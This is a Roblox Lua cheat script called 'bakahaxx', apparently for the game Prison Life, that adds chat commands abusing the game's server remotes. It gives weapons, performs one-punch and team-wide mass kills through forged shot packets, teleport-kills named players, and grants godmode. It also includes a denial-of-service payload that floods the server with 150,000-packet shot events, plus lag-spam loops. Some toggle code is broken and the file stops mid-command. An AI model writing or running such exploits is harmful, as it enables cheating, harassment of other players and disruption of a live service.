--[[
bbbbbbbb                                                                                                                                              
b::::::b                              kkkkkkkk                          hhhhhhh                                                                       
b::::::b                              k::::::k                          h:::::h                                                                       
b::::::b                              k::::::k                          h:::::h                                                                       
 b:::::b                              k::::::k                          h:::::h                                                                       
 b:::::bbbbbbbbb      aaaaaaaaaaaaa    k:::::k    kkkkkkkaaaaaaaaaaaaa   h::::h hhhhh         aaaaaaaaaaaaa   xxxxxxx      xxxxxxxxxxxxxx      xxxxxxx
 b::::::::::::::bb    a::::::::::::a   k:::::k   k:::::k a::::::::::::a  h::::hh:::::hhh      a::::::::::::a   x:::::x    x:::::x  x:::::x    x:::::x 
 b::::::::::::::::b   aaaaaaaaa:::::a  k:::::k  k:::::k  aaaaaaaaa:::::a h::::::::::::::hh    aaaaaaaaa:::::a   x:::::x  x:::::x    x:::::x  x:::::x  
 b:::::bbbbb:::::::b           a::::a  k:::::k k:::::k            a::::a h:::::::hhh::::::h            a::::a    x:::::xx:::::x      x:::::xx:::::x   
 b:::::b    b::::::b    aaaaaaa:::::a  k::::::k:::::k      aaaaaaa:::::a h::::::h   h::::::h    aaaaaaa:::::a     x::::::::::x        x::::::::::x    
 b:::::b     b:::::b  aa::::::::::::a  k:::::::::::k     aa::::::::::::a h:::::h     h:::::h  aa::::::::::::a      x::::::::x          x::::::::x     
 b:::::b     b:::::b a::::aaaa::::::a  k:::::::::::k    a::::aaaa::::::a h:::::h     h:::::h a::::aaaa::::::a      x::::::::x          x::::::::x     
 b:::::b     b:::::ba::::a    a:::::a  k::::::k:::::k  a::::a    a:::::a h:::::h     h:::::ha::::a    a:::::a     x::::::::::x        x::::::::::x    
 b:::::bbbbbb::::::ba::::a    a:::::a k::::::k k:::::k a::::a    a:::::a h:::::h     h:::::ha::::a    a:::::a    x:::::xx:::::x      x:::::xx:::::x   
 b::::::::::::::::b a:::::aaaa::::::a k::::::k  k:::::ka:::::aaaa::::::a h:::::h     h:::::ha:::::aaaa::::::a   x:::::x  x:::::x    x:::::x  x:::::x  
 b:::::::::::::::b   a::::::::::aa:::ak::::::k   k:::::ka::::::::::aa:::ah:::::h     h:::::h a::::::::::aa:::a x:::::x    x:::::x  x:::::x    x:::::x 
 bbbbbbbbbbbbbbbb     aaaaaaaaaa  aaaakkkkkkkk    kkkkkkkaaaaaaaaaa  aaaahhhhhhh     hhhhhhh  aaaaaaaaaa  aaaaxxxxxxx      xxxxxxxxxxxxxx      xxxxxxx
--]]

	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text = "bakahaxx by baka#4074",
	Color = Color3.fromRGB(207, 96, 36)
	})
	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text = "type :cmds to view commands",
	Color = Color3.fromRGB(207, 96, 36)
	})
	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text = "Your Prefix Is Currently : (enjoy)",
	Color = Color3.fromRGB(207, 96, 36)
	})
	wait(0.8)
	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text = "loaded scripts",
	Color = Color3.fromRGB(44, 101, 29)
	})
	wait(0.5)
	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text = "happy trollering",
	Color = Color3.fromRGB(9, 137, 207)
	})
  
	game:GetService("Players").LocalPlayer.PlayerGui.Home.fadeFrame.Visible = false

	-- tables --
	local onepunchconnection = {}

	-- vars --
	local Player = game:GetService("Players")
	local LocalPlayer = Player.LocalPlayer
	local PlayerScripts = LocalPlayer.PlayerScripts
	local prefix = ":"

	-- functions --
	function loadchar(brickcolor)
		local pos = LocalPlayer.Character.HumanoidRootPart.CFrame
		workspace.Remote.loadchar:InvokeServer("string", brickcolor)
		wait(.2)
		LocalPlayer.Character.HumanoidRootPart.CFrame = pos
	end

	function ConsoleMessage(text)
		local sg = game:GetService("StarterGui")
		local Method = "ChatMakeSystemMessage"
		sg:SetCore(Method, {Text = text, TextSize = 18, Color = Color3.new(0.666667, 0.666667, 1)})
	end

	function findPlr(self)
		for k, b in pairs(game.Players:GetPlayers()) do
			if string.find(b.Name:lower(), self) then
				return b
			end
		end
	end

	LocalPlayer.Chatted:Connect(
		function(msg)
			if msg:match(prefix .. "t dr") then
				loadchar("Crimson")
				_G.CurrentColor = "Crimson"
				ConsoleMessage("[Color Changer] Your color is now Dark Red")
			elseif msg:match(prefix .. "t g") then
				loadchar("Dark green")
				_G.CurrentColor = "Dark green"
				ConsoleMessage("[Color Changer] Your color is now Dark green")
			elseif msg:match(prefix .. "t p") then
				loadchar("Eggplant")
				_G.CurrentColor = "Eggplant"
				ConsoleMessage("[Color Changer] Your color is now Purple")
			elseif msg:match(prefix .. "t fb") then
				loadchar("Fawn brown")
				_G.CurrentColor = "Fawn brown"
				ConsoleMessage("[Color Changer] Your color is now Fawn brown")
			elseif msg:match(prefix .. "t mg") then
				loadchar("Mid gray")
				_G.CurrentColor = "Mid gray"
				ConsoleMessage("[Color Changer] Your color is now Mid gray")
			elseif msg:match(prefix .. "t hp") then
				loadchar("Hot pink")
				_G.CurrentColor = "Hot pink"
				ConsoleMessage("[Color Changer] Your color is now Hot pink")
			elseif msg:match(prefix .. "t t") then
				loadchar("Teal")
				_G.CurrentColor = "Teal"
				ConsoleMessage("[Color Changer] Your color is now Teal")
			elseif msg:match(prefix .. "c dt") then
				loadchar("Dark taupe")
				_G.CurrentColor = "Dark taupe"
				ConsoleMessage("[Color Changer] Your color is now Dark taupe")
			elseif msg:match(prefix .. "t lr") then
				loadchar("Light red")
				_G.CurrentColor = "Light red"
				ConsoleMessage("[Color Changer] Your color is now Light red")
			elseif msg:match(prefix .. "t lp") then
				loadchar("Light purple")
				_G.CurrentColor = "Light purple"
				ConsoleMessage("[Color Changer] Your color is now Light purple")
			elseif msg:match(prefix .. "t c") then
				loadchar("Camo")
				_G.CurrentColor = "Camo"
				ConsoleMessage("[Color Changer] Your color is now Camo")
			elseif msg:match(prefix .. "t lo") then
				loadchar("Light orange")
				_G.CurrentColor = "Light orange"
				ConsoleMessage("[Color Changer] Your color is now Light orange")
			elseif msg:match(prefix .. "t b") then
				loadchar("Pastel Blue")
				_G.CurrentColor = "Pastel Blue"
				ConsoleMessage("[Color Changer] Your color is now Pastel Blue")
			elseif msg:match(prefix .. "t rp") then
				loadchar("Royal purple")
				_G.CurrentColor = "Royal purple"
				ConsoleMessage("[Color Changer] Your color is now Royal purple")
			elseif msg:match(prefix .. "t g") then
				loadchar("Gold")
				_G.CurrentColor = "Gold"
				ConsoleMessage("[Color Changer] Your color is now Gold")
			elseif msg:match(prefix .. "t sun") then
				loadchar("Sunrise")
				_G.CurrentColor = "Sunrise"
				ConsoleMessage("[Color Changer] Your color is now Sunrise")
			elseif msg:match(prefix .. "t rl") then
				loadchar("Reddish lilac")
				_G.CurrentColor = "Reddish lilac"
				ConsoleMessage("[Color Changer] Your color is now Reddish lilac")
			elseif msg:match(prefix .. "t rb") then
				loadchar("Really black")
				_G.CurrentColor = "Really black"
				ConsoleMessage("[Color Changer] Your color is now Really black")
			elseif msg:match(prefix .. "t y") then
				loadchar("Pastel yellow")
				_G.CurrentColor = "Pastel yellow"
				ConsoleMessage("[Color Changer] Your color is now Pastel yellow")
			elseif msg:match(prefix.."t custom ") then
				loadchar( msg:sub(11) )
				ConsoleMessage("[Color Changer] Custom color is " .. msg:sub(11) )
			elseif msg:match(prefix .. "auto on") then
_G.toggle = true

while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)

      if game:GetService("Workspace")[blah].Humanoid.Health == 0 then
	   saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		local A_1 = "LocalPlayer"

local Event = game:GetService("Workspace").Remote.loadchar
Event:InvokeServer(A_1)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
end
			elseif msg:match(prefix .. "auto off") then
_G.toggle = false

while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)

      if game:GetService("Workspace")[blah].Humanoid.Health == 0 then
	   saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		local A_1 = "LocalPlayer"

local Event = game:GetService("Workspace").Remote.loadchar
Event:InvokeServer(A_1)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
end
			elseif msg:match(prefix .. "lguns on") then
                _G.toggle = true

                while _G.toggle == true do
                wait()
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
                end
			elseif msg:match(prefix .. "antic") then
				local anticrash = PlayerScripts.ClientGunReplicator
				anticrash.Disabled = true
			elseif msg:match(prefix .. "close") then
				game:shutdown()
			elseif msg:match(prefix .. "lguns off") then
		_G.toggle = false

                while _G.toggle == true do
                wait()
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
                end
			elseif msg:match(prefix .. "guns") then
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
			elseif msg:match(prefix .. "bring ") then
        for i,v in pairs(GetPlayer(msg:sub(8))) do
        game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		local mainhand = game.Players.LocalPlayer.Backpack:FindFirstChild("Remington 870").Handle
		mainhand.Size = Vector3.new(5, 5, 5)
		local NOW = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.Humanoid.Name = 1
		local l = game.Players.LocalPlayer.Character["1"]:Clone()
		l.Parent = game.Players.LocalPlayer.Character
		l.Name = "Humanoid"
		wait(0.2)
		game.Players.LocalPlayer.Character["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
		wait(0.2)
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,x in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(x)
		end
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
		wait(0.2)
		for i,x in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(x)
		end
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
		wait(0.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
		wait(0.01)
		game.Players.LocalPlayer.Character:MoveTo(v.Character.Position)
		wait(0.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
		wait(0.001)
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local A_1 = "\66\114\111\121\111\117\98\97\100\100"
local Event = game:GetService("Workspace").Remote.loadchar
Event:InvokeServer(A_1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
wait(0.01)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-936.546631, 94.1287842, 1990.08435)
			elseif msg:match(prefix .. "punch") then
				mainRemotes = game.ReplicatedStorage
meleeRemote = mainRemotes['meleeEvent']
mouse = game.Players.LocalPlayer:GetMouse()
punching = false
cooldown = false

function punch()
cooldown = true
local part = Instance.new("Part", game.Players.LocalPlayer.Character)
part.Transparency = 1
part.Size = Vector3.new(5, 2, 3)
part.CanCollide = false
local w1 = Instance.new("Weld", part)
w1.Part0 = game.Players.LocalPlayer.Character.Torso
w1.Part1 = part
w1.C1 = CFrame.new(0,0,2)
part.Touched:connect(function(hit)
if game.Players:FindFirstChild(hit.Parent.Name) then
local plr = game.Players:FindFirstChild(hit.Parent.Name) 
if plr.Name ~= game.Players.LocalPlayer.Name then
part:Destroy()

for i = 1,100 do
meleeRemote:FireServer(plr)
end
end
end
end)

wait(1)
cooldown = false
part:Destroy()
end


mouse.KeyDown:connect(function(key)
if cooldown == false then
if key:lower() == "f" then

punch()

end
end
end)
			elseif msg:match(prefix .. "fp on") then
_G.toggle = true
 
while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)
 
local screept = game:GetService("Players").LocalPlayer.Character.ClientInputHandler
getsenv(screept).cs.isFighting = false
end
 
        elseif msg:match(prefix .. "fp off") then
_G.toggle = false
 
while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)
 
local screept = game:GetService("Players").LocalPlayer.Character.ClientInputHandler
getsenv(screept).cs.isFighting = false
end
             elseif msg:match(prefix .. "smoke") then
                        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v:IsA("Tool") then
                                v.Parent = game.Players.LocalPlayer.Backpack
                        end
                end
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
                wait()
                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GripUp = Vector3.new(-1,-500,-500)
                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GripPos = Vector3.new(0.9,0.9,-2.3)
                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GripRight = Vector3.new(0,0,0)
                wait()
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v:IsA("Tool") then
                                v.Parent = game.Players.LocalPlayer.Backpack
                        end
                end
                wait()
                game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
             elseif msg:match(prefix .. "troll") then
                                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v:IsA("Tool") then
                                v.Parent = game.Players.LocalPlayer.Backpack
                        end
                end
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
                wait()
                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GripForward = Vector3.new(10,1,500)
                wait()
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v:IsA("Tool") then
                                v.Parent = game.Players.LocalPlayer.Backpack
                        end
                end
                wait()
                game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
	         elseif msg:match(prefix .. "end") then
		    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
		    Text = "(ALL GUNS) IF YOU DON'T HAVE M4 I DON'T KNOW IF IT WORKS BUT YOU CAN EDIT IT SO IF YOU DON'T HAVE M4 IT WILL WORK BUT IT DOES LESS DAMAGE OK",
		    Color = Color3.fromRGB(124, 92, 70)
	            })
		 local PackageSize = 150000 -- How many bullets is sent through in one remote call. Thanks Globals
                 local SendPackageAmountOfTimes =  18 -- How many times the remote should be called.

                 local ReplicatedStorage = game:GetService("ReplicatedStorage")
                 local Players = game:GetService("Players")
                 local LocalPlayer = Players.LocalPlayer

                 local ItemHandler = workspace:WaitForChild("Remote").ItemHandler
                 local ShootEvent = ReplicatedStorage:WaitForChild("ShootEvent")

                 ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                 local Tool = Players.LocalPlayer.Backpack["Remington 870"]
		 ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
                 local Tool = Players.LocalPlayer.Backpack["AK-47"]
		 ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
                 local Tool = Players.LocalPlayer.Backpack["M9"]
		 ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
                 local Tool = Players.LocalPlayer.Backpack["M4A1"]

                 local Packet = {
                 RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
                 Distance = 10000,
                 Cframe = CFrame.new(0, 0, 0),
                 Hit = workspace:FindFirstChildOfClass("Part")
                }

                 local Package = {}

                 for i = 1, PackageSize do
                 Package[i] = Packet
             end

    for i = 1, SendPackageAmountOfTimes do
        ShootEvent:FireServer(Package, Tool)
    end
	         elseif msg:match(prefix .. "time") then
if not _G.FullBrightExecuted then

	_G.FullBrightEnabled = false

	_G.NormalLightingSettings = {
		Brightness = game:GetService("Lighting").Brightness,
		ClockTime = game:GetService("Lighting").ClockTime,
		FogEnd = game:GetService("Lighting").FogEnd,
		GlobalShadows = game:GetService("Lighting").GlobalShadows,
		Ambient = game:GetService("Lighting").Ambient
	}

	game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
		if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
			_G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").Brightness = 1
		end
	end)

	game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
		if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
			_G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").ClockTime = 12
		end
	end)

	game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
		if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
			_G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").FogEnd = 786543
		end
	end)

	game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
		if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
			_G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").GlobalShadows = false
		end
	end)

	game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
		if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
			_G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
		end
	end)

	game:GetService("Lighting").Brightness = 1
	game:GetService("Lighting").ClockTime = 12
	game:GetService("Lighting").FogEnd = 786543
	game:GetService("Lighting").GlobalShadows = false
	game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)

	local LatestValue = true
	spawn(function()
		repeat
			wait()
		until _G.FullBrightEnabled
		while wait() do
			if _G.FullBrightEnabled ~= LatestValue then
				if not _G.FullBrightEnabled then
					game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
					game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
					game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
					game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
					game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
				else
					game:GetService("Lighting").Brightness = 1
					game:GetService("Lighting").ClockTime = 12
					game:GetService("Lighting").FogEnd = 786543
					game:GetService("Lighting").GlobalShadows = false
					game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
				end
				LatestValue = not LatestValue
			end
		end
	end)
end

_G.FullBrightExecuted = true
_G.FullBrightEnabled = not _G.FullBrightEnabled
            elseif msg:match(prefix .. "lag") then
_G.toggle = true
 
while _G.toggle == true do
wait(0.0000000000000000000000001)
workspace.Remote.TeamEvent:FireServer("Bright blue")
 
for i = 10000000000000000000000000000000,99999999999999999999999999999999999999999999999999,1 do
    for i,v in pairs(Workspace.Prison_ITEMS.clothes:GetChildren()) do
 
laggy = Workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
wait(0.001)
laggy = Workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
wait(0.001)
laggy = Workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
wait(0.001)
laggy = Workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
wait(0.001)
laggy = Workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
wait(0.001)
laggy = Workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
end
end
end

            elseif msg:match(prefix .. "lag off") then
workspace.Remote.TeamEvent:FireServer("Bright orange")
wait(0.001)
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local A_1 = "\66\114\111\121\111\117\98\97\100\100"
local Event = game:GetService("Workspace").Remote.loadchar
Event:InvokeServer(A_1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
            elseif msg:match(prefix .. "lkc on") then
_G.toggle = true

while _G.toggle == true do
wait()
                                                function getPacketFromPlayer(tget)
                                        return {
                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
                                                ["Distance"] = 0,
                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
                                                ["Hit"] = tget.Character.Head
                                        }
                                end
                                local arg1 = {}
                                for i, v in pairs(game:GetService("Teams").Criminals:GetPlayers()) do
                                        for i2 = 1, 7 do
                                                table.insert(arg1, getPacketFromPlayer(v))
                                        end
                                end
                               
                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                wait(0.1)
local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = 15
sM["MaxAmmo"] = 6
sM["CurrentAmmo"] = 6
sM["StoredAmmo"] = 600
sM["FireRate"] = 0.8
sM["AmmoPerClip"] = 6
sM["Range"] = 400
sM["ReloadTime"] = 4
sM["Bullets"] = 5
sM["AutoFire"] = false
end
            elseif msg:match(prefix .. "lkc off") then
_G.toggle = false

while _G.toggle == true do
wait()
                                                function getPacketFromPlayer(tget)
                                        return {
                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
                                                ["Distance"] = 0,
                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
                                                ["Hit"] = tget.Character.Head
                                        }
                                end
                                local arg1 = {}
                                for i, v in pairs(game:GetService("Teams").Criminals:GetPlayers()) do
                                        for i2 = 1, 7 do
                                                table.insert(arg1, getPacketFromPlayer(v))
                                        end
                                end
                               
                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                wait(0.2)
local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = 15
sM["MaxAmmo"] = 6
sM["CurrentAmmo"] = 6
sM["StoredAmmo"] = 600
sM["FireRate"] = 0.8
sM["AmmoPerClip"] = 6
sM["Range"] = 400
sM["ReloadTime"] = 4
sM["Bullets"] = 5
sM["AutoFire"] = false
end
            elseif msg:match(prefix .. "lki on") then
_G.toggle = true

while _G.toggle == true do
wait()
                                                function getPacketFromPlayer(tget)
                                        return {
                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
                                                ["Distance"] = 0,
                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
                                                ["Hit"] = tget.Character.Head
                                        }
                                end
                                local arg1 = {}
                                for i, v in pairs(game:GetService("Teams").Inmates:GetPlayers()) do
                                        for i2 = 1, 7 do
                                                table.insert(arg1, getPacketFromPlayer(v))
                                        end
                                end
                               
                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                wait(0.2)
local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = 15
sM["MaxAmmo"] = 6
sM["CurrentAmmo"] = 6
sM["StoredAmmo"] = 600
sM["FireRate"] = 0.8
sM["AmmoPerClip"] = 6
sM["Range"] = 400
sM["ReloadTime"] = 4
sM["Bullets"] = 5
sM["AutoFire"] = false
end            

elseif msg:match(prefix .. "lki off") then
_G.toggle = false

while _G.toggle == true do
wait()
                                                function getPacketFromPlayer(tget)
                                        return {
                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
                                                ["Distance"] = 0,
                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
                                                ["Hit"] = tget.Character.Head
                                        }
                                end
                                local arg1 = {}
                                for i, v in pairs(game:GetService("Teams").Inmates:GetPlayers()) do
                                        for i2 = 1, 7 do
                                                table.insert(arg1, getPacketFromPlayer(v))
                                        end
                                end
                               
                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                wait(0.2)
local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = 15
sM["MaxAmmo"] = 6
sM["CurrentAmmo"] = 6
sM["StoredAmmo"] = 600
sM["FireRate"] = 0.8
sM["AmmoPerClip"] = 6
sM["Range"] = 400
sM["ReloadTime"] = 4
sM["Bullets"] = 5
sM["AutoFire"] = false
end
		    elseif msg:match(prefix .. "sg on") then
_G.toggle = true
 
while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)
 
local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Prison Gate"]["Prison Gate"];
local Target = game:GetService("Workspace").Remote.ItemHandler;
Target:InvokeServer(userdata_1);
end
 
          elseif msg:match(prefix .. "sg off") then
_G.toggle = false
 
while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)
 
local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Prison Gate"]["Prison Gate"];
local Target = game:GetService("Workspace").Remote.ItemHandler;
Target:InvokeServer(userdata_1);
end
	    elseif msg:match(prefix .. "quick punch") then
spawn(function()
    while wait() do
        pcall(function()
                getsenv(game.Players.LocalPlayer.Character.ClientInputHandler).cs.isFighting = false
                getsenv(game.Players.LocalPlayer.Character.ClientInputHandler).cs.isRunning = false
            end)
        end
end)
            elseif msg:match(prefix .. "god on") then
_G.toggle = true
 
while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = true
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
wait(5)
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = true
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
local Event = game:GetService("Workspace").Remote.loadchar
Event:InvokeServer(A_1)
